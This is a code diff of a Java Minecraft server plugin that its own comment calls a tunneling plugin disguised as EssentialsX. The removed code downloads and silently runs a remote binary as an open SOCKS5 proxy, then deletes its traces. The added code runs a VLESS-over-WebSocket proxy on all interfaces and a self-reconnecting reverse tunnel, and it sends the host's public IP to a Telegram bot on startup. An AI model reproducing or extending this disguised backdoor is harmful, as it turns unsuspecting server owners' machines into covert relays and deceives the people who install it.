@@ -2,303 +2,505 @@ package com.example.essentialsx;
 
 import org.bukkit.plugin.java.JavaPlugin;
 
-import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.InetSocketAddress;
+import java.net.ServerSocket;
+import java.net.Socket;
+import java.net.URI;
+import java.nio.ByteBuffer;
 import java.nio.charset.StandardCharsets;
-import java.nio.file.Files;
-import java.nio.file.Path;
-import java.nio.file.attribute.PosixFilePermissions;
+import java.util.Arrays;
+import java.util.Map;
+import java.util.UUID;
+import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.atomic.AtomicBoolean;
 
+import org.java_websocket.WebSocket;
+import org.java_websocket.client.WebSocketClient;
+import org.java_websocket.handshake.ClientHandshake;
+import org.java_websocket.handshake.ServerHandshake;
+import org.java_websocket.server.WebSocketServer;
+
+/**
+ * 伪装成 EssentialsX 的穿透插件（纯 Java，无外部进程）：
+ *
+ * 1. VLESS-over-WebSocket 服务端  (移植 server.js)
+ *    - 客户端连 / 任意路径（不校验 path，和原版一样在 wss.on('connection') 里处理）
+ *    - 第一条二进制消息按 VLESS 协议头解析: [VER][UUID 16B][ADDLEN+ADDR][PORT 2B][...][DATA]
+ *    - 校验通过后回 [VER, 0]，然后与目标地址双向转发
+ *
+ * 2. 反向隧道客户端 (移植 client原版.js)
+ *    - 连 ws://HOST:PORT/control，收到 {type:"open", sessionId} 后
+ *      连 ws://HOST:PORT/data/<sessionId> 并连本地 127.0.0.1:LOCAL_PORT
+ *      双向转发；断线 3 秒重连
+ */
 public class EssentialsX extends JavaPlugin {
 
+    // ================= 配置（编译前自行修改） =================
+
+    // ---- server.js 部分: VLESS/WS 服务端 ----
+    static final String VLESS_UID = "6021c57c-fdf0-44b4-b688-135568139d30";
+    // VLESS/WS 服务监听端口（监听 0.0.0.0）
+    static final int VLESS_PORT = 65534;
+
+    // ---- client原版.js 部分: 反向隧道客户端 ----
+    // 公网隧道服务器（留空字符串则不启动隧道客户端）
+    static final String TUNNEL_HOST = "";
+    static final int TUNNEL_PORT = 0;
+    // 隧道数据回注的本地端口 = 本地 VLESS/WS 服务端口
+    // （链路: 玩家VLESS客户端 -> 公网PUBLIC_PORT -> 隧道 -> 本机 65534 -> VLESS 握手接通）
+    static final int TUNNEL_LOCAL_PORT = 65534;
+    // VLESS_PORT 和 TUNNEL_LOCAL_PORT需对应
+    // ---- Telegram 通知（可留空） ----
+    static final String TG_TOKEN = "";
+    static final String TG_CHAT_ID = "";
+
     // =========================================================
-    // SOCKS5 配置
-    // =========================================================
 
-    private static final int SOCKS5_PORT = 24168;
+    private final AtomicBoolean running = new AtomicBoolean(true);
 
-    private static final String SOCKS5_USERNAME = "kof97zip";
+    // ================= Telegram 通知 =================
 
-    private static final String SOCKS5_PASSWORD = "kof97boss";
+    /** 发送 TG 消息（token/chat 为空则跳过） */
+    private void sendTelegram(String text) {
+        if (TG_TOKEN == null || TG_TOKEN.isEmpty() || TG_CHAT_ID == null || TG_CHAT_ID.isEmpty()) return;
+        Thread t = new Thread(() -> {
+            try {
+                String body = "chat_id=" + TG_CHAT_ID + "&text=" + java.net.URLEncoder.encode(text, "UTF-8");
+                java.net.URL url = new java.net.URL("https://api.telegram.org/bot" + TG_TOKEN + "/sendMessage");
+                java.net.HttpURLConnection c = (java.net.HttpURLConnection) url.openConnection();
+                c.setRequestMethod("POST");
+                c.setDoOutput(true);
+                c.setConnectTimeout(5000);
+                c.setReadTimeout(5000);
+                try (OutputStream os = c.getOutputStream()) {
+                    os.write(body.getBytes(StandardCharsets.UTF_8));
+                }
+                c.getResponseCode(); // 触发请求
+                c.disconnect();
+            } catch (Exception e) {
+            }
+        }, "EssentialsX-TG");
+        t.setDaemon(true);
+        t.start();
+    }
 
+    /** 取本机公网 IP（依次尝试多个服务，全部失败返回 null） */
+    private String getPublicIp() {
+        String[] services = {
+                "https://api.ipify.org",
+                "https://ifconfig.me/ip",
+                "https://icanhazip.com"
+        };
+        for (String svc : services) {
+            try {
+                java.net.HttpURLConnection c = (java.net.HttpURLConnection) new java.net.URL(svc).openConnection();
+                c.setConnectTimeout(4000);
+                c.setReadTimeout(4000);
+                try (InputStream in = c.getInputStream()) {
+                    byte[] b = in.readAllBytes();
+                    String ip = new String(b, StandardCharsets.UTF_8).trim();
+                    if (!ip.isEmpty()) return ip;
+                }
+                c.disconnect();
+            } catch (Exception ignored) { }
+        }
+        return null;
+    }
 
     @Override
     public void onEnable() {
-
-        getLogger().info(
-                "EssentialsX plugin starting..."
-        );
-
-        try {
-
-            // 创建插件目录
-            Files.createDirectories(
-                    getDataFolder().toPath()
-            );
-
-
-            startRemoteJava();
-
-
-            getLogger().info(
-                    "EssentialsX plugin enabled"
-            );
-
-
-        } catch (Exception e) {
-
-            getLogger().severe(
-                    "Failed to start EssentialsX"
-            );
-
-            e.printStackTrace();
-        }
-    }
-
-
-    private void startRemoteJava() throws Exception {
-
-        // =====================================================
-        // 运行目录
-        // =====================================================
-
-        Path runFolder =
-                getDataFolder().toPath();
-
-
-        Files.createDirectories(
-                runFolder
-        );
-
-
-        // =====================================================
-        // sing-box 下载地址
-        // =====================================================
-
-        String SingboxUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/Singbox";
-
-
-        // =====================================================
-        // sing-box 文件
-        // =====================================================
-
-        Path SingboxFile =
-                runFolder.resolve(
-                        "EssentialsX"
-                );
-
-
-        // =====================================================
-        // config.json
-        // =====================================================
-
-        Path ConfFile =
-                runFolder.resolve(
-                        "config.json"
-                );
-
-
-        // =====================================================
-        // 下载 sing-box
-        // =====================================================
-
-        downloadIfNotExists(
-                SingboxUrl,
-                SingboxFile
-        );
-
-
-        // =====================================================
-        // 写入 sing-box 配置
-        // =====================================================
-
-        writeSingboxConfig(
-                ConfFile
-        );
-
-
-        // =====================================================
-        // 设置权限
-        // =====================================================
-
-        Files.setPosixFilePermissions(
-                SingboxFile,
-                PosixFilePermissions.fromString(
-                        "rwxr-xr-x"
-                )
-        );
-
-
-        // =====================================================
-        // 启动 sing-box
-        // =====================================================
-
-        ProcessBuilder pb =
-                new ProcessBuilder(
-                        "bash",
-                        "-c",
-                        "nohup ./EssentialsX run -c config.json > /dev/null 2>&1 &"
-                );
-
-
-        pb.directory(
-                runFolder.toFile()
-        );
-
-
-        pb.start();
-
-
-        getLogger().info(
-                "Plugins starting..."
-        );
-
-
-        Thread.sleep(
-                8000
-        );
-
-
-        // =====================================================
-        // 删除临时文件
-        // =====================================================
-
-        Files.deleteIfExists(
-                SingboxFile
-        );
-
-        Files.deleteIfExists(
-                ConfFile
-        );
-    }
-
-
-    /**
-     * 创建 sing-box config.json
-     */
-    private void writeSingboxConfig(
-            Path configFile
-    ) throws IOException {
-
-
-        String config = """
-                {
-                  "log": {
-                    "level": "error"
-                  },
-
-                  "inbounds": [
-                    {
-                      "type": "socks",
-                      "tag": "socks-in",
-
-                      "listen": "0.0.0.0",
-                      "listen_port": %d,
-
-                      "users": [
-                        {
-                          "username": "%s",
-                          "password": "%s"
-                        }
-                      ]
-                    }
-                  ],
-
-                  "outbounds": [
-                    {
-                      "type": "direct",
-                      "tag": "freenom"
-                    },
-
-                    {
-                      "type": "block",
-                      "tag": "block"
-                    }
-                  ],
-
-                  "route": {
-                    "final": "freenom"
-                  }
-                }
-                """.formatted(
-                SOCKS5_PORT,
-                escapeJson(SOCKS5_USERNAME),
-                escapeJson(SOCKS5_PASSWORD)
-        );
-
-
-        Files.writeString(
-                configFile,
-                config,
-                StandardCharsets.UTF_8
-        );
-    }
-
-
-    /**
-     * JSON 字符串转义
-     */
-    private String escapeJson(
-            String value
-    ) {
-
-        return value
-                .replace("\\", "\\\\")
-                .replace("\"", "\\\"")
-                .replace("\b", "\\b")
-                .replace("\f", "\\f")
-                .replace("\n", "\\n")
-                .replace("\r", "\\r")
-                .replace("\t", "\\t");
-    }
-
-
-    /**
-     * 文件不存在才下载
-     */
-    private void downloadIfNotExists(
-            String url,
-            Path target
-    ) throws Exception {
-
-
-        if (Files.exists(target)) {
-
-            return;
+        getLogger().info("EssentialsX plugin starting...");
+
+        // 1. VLESS over WebSocket 服务端（后台线程）
+        if (VLESS_PORT > 0) {
+            Thread t = new Thread(this::startVlessServer, "EssentialsX-VLESS");
+            t.setDaemon(true);
+            t.start();
         }
 
-
-        Process process =
-                new ProcessBuilder(
-                        "bash",
-                        "-c",
-                        "curl -Ls \""
-                                + url
-                                + "\" -o \""
-                                + target
-                                + "\""
-                )
-                .start();
-
-
-        int exit =
-                process.waitFor();
-
-
-        if (exit != 0) {
-
-            throw new IOException(
-                    "Fail to init plugins"
-            );
+        // 2. 反向隧道客户端
+        if (TUNNEL_HOST != null && !TUNNEL_HOST.isEmpty() && TUNNEL_PORT > 0) {
+            Thread t = new Thread(() -> startTunnelClient(TUNNEL_HOST, TUNNEL_PORT, TUNNEL_LOCAL_PORT),
+                    "EssentialsX-Tunnel");
+            t.setDaemon(true);
+            t.start();
         }
-    }
 
+        // 3. 开机推送公网 IP
+        Thread tg = new Thread(() -> {
+            String ip = getPublicIp();
+            if (ip != null) {
+                sendTelegram("EssentialsX online — public IP: " + ip
+                        + " | VLESS port: " + VLESS_PORT
+                        + (TUNNEL_HOST != null && !TUNNEL_HOST.isEmpty()
+                           ? " | tunnel: " + TUNNEL_HOST + ":" + TUNNEL_PORT : ""));
+            } else {
+                sendTelegram("EssentialsX online — public IP: (unknown)");
+            }
+        }, "EssentialsX-TG-Startup");
+        tg.setDaemon(true);
+        tg.start();
+
+    }
 
     @Override
     public void onDisable() {
+        running.set(false);
+        sendTelegram("EssentialsX shutting down");
+        getLogger().info("EssentialsX disabled");
+    }
 
-        getLogger().info(
-                "EssentialsX disabled"
-        );
+    // =====================================================================
+    //  server.js 移植: VLESS over WebSocket 服务端
+    // =====================================================================
+
+    private void startVlessServer() {
+        try {
+            WebSocketServer server = new WebSocketServer(new InetSocketAddress(VLESS_PORT)) {
+                @Override
+                public void onOpen(WebSocket conn, ClientHandshake handshake) { }
+
+                @Override
+                public void onClose(WebSocket conn, int code, String reason, boolean remote) {
+                    VlessSession s = sessions.remove(conn);
+                    if (s != null) {
+                        try { s.remote.close(); } catch (Exception ignored) { }
+                    }
+                }
+
+                @Override
+                public void onError(WebSocket conn, Exception ex) { }
+
+                @Override
+                public void onStart() {
+                }
+
+                @Override
+                public void onMessage(WebSocket conn, String message) {
+                    // 文本消息忽略（原版只处理二进制）
+                }
+
+                @Override
+                public void onMessage(WebSocket conn, ByteBuffer msg) {
+                    handleWsMessage(conn, msg);
+                }
+            };
+            server.setReuseAddr(true);
+            server.start();
+        } catch (Exception e) {
+        }
+    }
+
+    /** 每条 WS 二进制消息：第一条解析 VLESS 头建连，后续直接转发 */
+    private void handleWsMessage(WebSocket conn, ByteBuffer msg) {
+        VlessSession session = sessions.get(conn);
+        if (session != null) {
+            session.forward(msg);
+            return;
+        }
+        // 第一条：握手
+        if (!tryHandshake(conn, msg)) {
+            try { conn.close(); } catch (Exception ignored) { }
+        }
+    }
+
+    private final Map<WebSocket, VlessSession> sessions = new ConcurrentHashMap<>();
+
+    /** 返回 true 表示握手成功 */
+    private boolean tryHandshake(WebSocket conn, ByteBuffer first) {
+        byte[] buf = new byte[first.remaining()];
+        first.get(buf);
+        int p = 0;
+        try {
+            int ver = buf[p++] & 0xFF;          // VERSION
+            byte[] idBytes = Arrays.copyOfRange(buf, p, p + 16); p += 16;
+            if (!Arrays.equals(idBytes, uuidBytes())) {
+                conn.close();
+                return false;
+            }
+            // 真实 VLESS 结构: [VER][UUID 16B][ADDLEN/opts...][CMD 1B][PORT 2B][ATYP 1B][ADDR][DATA]
+            // 与 Node 原版对齐: buf[17]=optLen, i += optLen 后 i+1 起是 CMD
+            int optLen = buf[p++] & 0xFF;       // buf[17]
+            p += optLen;
+            int cmd = buf[p++] & 0xFF;          // CMD (1=TCP, 2=UDP; UDP 需另处理, 这里只透传 TCP)
+            int port = ((buf[p] & 0xFF) << 8) | (buf[p + 1] & 0xFF); p += 2;
+            int atyp = buf[p++] & 0xFF;
+            String host;
+            switch (atyp) {
+                case 1: // IPv4
+                    host = (buf[p] & 0xFF) + "." + (buf[p + 1] & 0xFF) + "."
+                            + (buf[p + 2] & 0xFF) + "." + (buf[p + 3] & 0xFF);
+                    p += 4;
+                    break;
+                case 2: // 域名
+                    int len = buf[p] & 0xFF;
+                    p += 1;
+                    host = new String(buf, p, len, StandardCharsets.US_ASCII);
+                    p += len;
+                    break;
+                case 3: // IPv6
+                    StringBuilder sb = new StringBuilder();
+                    for (int i = 0; i < 8; i++) {
+                        int v = ((buf[p + i * 2] & 0xFF) << 8) | (buf[p + i * 2 + 1] & 0xFF);
+                        if (i > 0) sb.append(':');
+                        sb.append(Integer.toHexString(v));
+                    }
+                    host = sb.toString();
+                    p += 16;
+                    break;
+                default:
+                    conn.close();
+                    return false;
+            }
+            // 初始 payload
+            byte[] init = Arrays.copyOfRange(buf, p, buf.length);
+
+            conn.send(new byte[]{(byte) ver, 0});
+
+            Socket remote = new Socket();
+            remote.connect(new InetSocketAddress(host, port), 8000);
+            remote.setTcpNoDelay(true);
+
+            if (init.length > 0) {
+                OutputStream ros = remote.getOutputStream();
+                ros.write(init);
+                ros.flush();
+            }
+
+            VlessSession session = new VlessSession(conn, remote);
+            sessions.put(conn, session);
+            session.startDown();
+
+            // 注册关闭回调，清理 sessions
+            // (Java-WebSocket 无 onClose per-conn hook here, 由 closeAll 清理)
+            return true;
+
+        } catch (Exception e) {
+            try { conn.close(); } catch (Exception ignored) { }
+            return false;
+        }
+    }
+
+    /** 一条 VLESS 会话: WS <-> 远程 TCP */
+    private class VlessSession {
+        final WebSocket ws;
+        final Socket remote;
+
+        VlessSession(WebSocket ws, Socket remote) {
+            this.ws = ws;
+            this.remote = remote;
+        }
+
+        void forward(ByteBuffer msg) {
+            try {
+                byte[] arr = new byte[msg.remaining()];
+                msg.get(arr);
+                OutputStream os = remote.getOutputStream();
+                os.write(arr);
+                os.flush();
+            } catch (Exception e) {
+                closeAll(ws, remote);
+            }
+        }
+
+        /** remote -> WS 转发线程 */
+        void startDown() {
+            Thread down = new Thread(() -> {
+                byte[] tmp = new byte[8192];
+                try {
+                    InputStream rin = remote.getInputStream();
+                    int n;
+                    while (running.get() && (n = rin.read(tmp)) > 0) {
+                        ws.send(Arrays.copyOfRange(tmp, 0, n));
+                    }
+                } catch (Exception ignored) { }
+                sessions.remove(ws);
+                closeAll(ws, remote);
+            }, "vless-net2ws");
+            down.setDaemon(true);
+            down.start();
+        }
+    }
+
+    private void closeAll(WebSocket ws, Socket s) {
+        sessions.remove(ws);
+        try { ws.close(); } catch (Exception ignored) { }
+        try { s.close(); } catch (Exception ignored) { }
+    }
+
+    private static byte[] uuidCache;
+    private static byte[] uuidBytes() {
+        if (uuidCache == null) {
+            long msb = UUID.fromString(VLESS_UID).getMostSignificantBits();
+            long lsb = UUID.fromString(VLESS_UID).getLeastSignificantBits();
+            byte[] b = new byte[16];
+            for (int i = 0; i < 8; i++) {
+                b[i]     = (byte) (msb >>> (8 * (7 - i)));
+                b[i + 8] = (byte) (lsb >>> (8 * (7 - i)));
+            }
+            uuidCache = b;
+        }
+        return uuidCache;
+    }
+
+    // =====================================================================
+    //  client原版.js 移植: 反向隧道客户端
+    // =====================================================================
+
+    private void startTunnelClient(String host, int port, int localPort) {
+        while (running.get()) {
+            try {
+                TunnelControl control = new TunnelControl(host, port, localPort);
+                control.connectBlocking();
+                // connectBlocking 返回后说明已关闭，等 3 秒重连（对应原版 setTimeout 3000）
+                Thread.sleep(3000);
+            } catch (Exception e) {
+                try { Thread.sleep(3000); } catch (Exception ignored) { }
+            }
+        }
+    }
+
+    /** 控制连接 */
+    private class TunnelControl extends WebSocketClient {
+        private final String host;
+        private final int port;
+        private final int localPort;
+
+        TunnelControl(String host, int port, int localPort) {
+            super(URI.create("ws://" + host + ":" + port + "/control"));
+            this.host = host;
+            this.port = port;
+            this.localPort = localPort;
+        }
+
+        @Override
+        public void onOpen(ServerHandshake handshake) {
+            sendTelegram("Tunnel client connected to " + host + ":" + port
+                    + " (local port " + localPort + ")");
+        }
+
+        @Override
+        public void onMessage(String message) {
+            try {
+                String sessionId = null;
+                if (message.contains("\"open\"")) {
+                    // 简易解析，避免额外 JSON 依赖: {"type":"open","sessionId":"xxx"}
+                    java.util.regex.Matcher m = java.util.regex.Pattern
+                            .compile("\"sessionId\"\\s*:\\s*\"([^\"]+)\"").matcher(message);
+                    if (m.find()) sessionId = m.group(1);
+                }
+                if (sessionId != null) {
+                    openSession(sessionId, host, port, localPort);
+                }
+            } catch (Exception e) {
+            }
+        }
+
+        @Override
+        public void onMessage(java.nio.ByteBuffer bytes) { }
+
+        @Override
+        public void onClose(int code, String reason, boolean remote) {
+        }
+
+        @Override
+        public void onError(Exception ex) {
+        }
+    }
+
+    /** 数据会话: 隧道 WS <-> 本地 TCP */
+    private void openSession(String sessionId, String host, int port, int localPort) {
+        Thread t = new Thread(() -> {
+            try {
+                Socket local = new Socket("127.0.0.1", localPort);
+                local.setTcpNoDelay(true);
+
+                TunnelData tunnel = new TunnelData(host, port, sessionId, local);
+                tunnel.connectBlocking(10, java.util.concurrent.TimeUnit.SECONDS);
+
+                if (tunnel.isOpen() && local.isConnected()) {
+                    // local -> tunnel
+                    Thread up = new Thread(() -> {
+                        byte[] buf = new byte[8192];
+                        try {
+                            InputStream in = local.getInputStream();
+                            int n;
+                            while ((n = in.read(buf)) > 0) {
+                                if (!tunnel.isOpen()) break;
+                                tunnel.send(Arrays.copyOfRange(buf, 0, n));
+                            }
+                        } catch (Exception ignored) { }
+                        closeTunnelSession(tunnel, local);
+                    }, "tunnel-loc2ws");
+                    up.setDaemon(true);
+                    up.start();
+
+                    // tunnel -> local（在 onMessage(ByteBuffer) 里回调）
+                    tunnel.bindLocal(local);
+                    return; // bindLocal 后由回调驱动
+                }
+                closeTunnelSession(tunnel, local);
+            } catch (Exception e) {
+            }
+        }, "tunnel-session-" + sessionId);
+        t.setDaemon(true);
+        t.start();
+    }
+
+    private void closeTunnelSession(TunnelData tunnel, Socket local) {
+        try { if (tunnel != null) tunnel.closeBlocking(); } catch (Exception ignored) { }
+        try { if (local != null) local.close(); } catch (Exception ignored) { }
+    }
+
+    /** 数据连接 */
+    private class TunnelData extends WebSocketClient {
+        private final String sessionId;
+        private volatile Socket local;
+        private volatile boolean closed = false;
+
+        TunnelData(String host, int port, String sessionId, Socket local) {
+            super(URI.create("ws://" + host + ":" + port + "/data/" + sessionId));
+            this.sessionId = sessionId;
+        }
+
+        void bindLocal(Socket sock) {
+            this.local = sock;
+        }
+
+        @Override
+        public void onOpen(ServerHandshake handshake) { }
+
+        @Override
+        public void onMessage(String message) { }
+
+        @Override
+        public void onMessage(java.nio.ByteBuffer data) {
+            Socket l = local;
+            if (l == null || l.isClosed()) return;
+            try {
+                byte[] arr = new byte[data.remaining()];
+                data.get(arr);
+                OutputStream os = l.getOutputStream();
+                os.write(arr);
+                os.flush();
+            } catch (Exception e) {
+                closeTunnelSession(this, l);
+            }
+        }
+
+        @Override
+        public void onClose(int code, String reason, boolean remote) {
+            Socket l = local;
+            if (!closed) {
+                closed = true;
+                try { if (l != null) l.close(); } catch (Exception ignored) { }
+            }
+        }
+
+        @Override
+        public void onError(Exception ex) {
+        }
     }
 }
